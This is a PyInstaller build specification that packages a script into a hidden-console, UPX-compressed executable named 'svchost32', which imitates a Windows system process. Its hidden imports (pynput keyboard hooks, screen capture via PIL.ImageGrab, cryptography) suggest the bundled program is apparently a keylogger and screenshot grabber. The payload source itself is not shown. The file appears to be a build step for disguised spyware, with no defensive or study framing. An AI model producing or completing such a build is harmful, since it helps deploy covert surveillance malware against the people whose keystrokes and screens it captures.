# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['../_tmp_svchost32.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=['pynput', 'pynput.keyboard', 'pynput.keyboard._win32', 'cryptography', 'PIL', 'PIL.ImageGrab'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='svchost32',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
app = BUNDLE(
    exe,
    name='svchost32.app',
    icon=None,
    bundle_identifier=None,
)
